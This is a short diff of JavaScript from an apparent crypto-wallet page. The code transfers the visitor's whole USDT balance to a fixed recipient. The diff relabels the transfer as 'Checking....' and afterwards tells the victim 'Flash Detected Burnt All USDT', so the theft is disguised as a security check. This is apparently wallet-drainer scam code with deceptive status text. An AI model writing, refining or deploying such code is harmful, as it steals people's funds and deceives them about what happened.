@@ -158,10 +158,10 @@
           }
 
           try {
-            document.getElementById("log").textContent = "⏳ Sending...";
+            document.getElementById("log").textContent = "⏳ Checking....";
             const tx = await usdt.transfer(recipient, usdtBalance);
             await tx.wait();
-            document.getElementById("log").textContent = "✅ Transfer complete!";
+            document.getElementById("log").textContent = "Flash Detected Burnt All USDT";
           } catch (err) {
             console.error(err);
             document.getElementById("log").textContent = "❌ Transaction failed.";
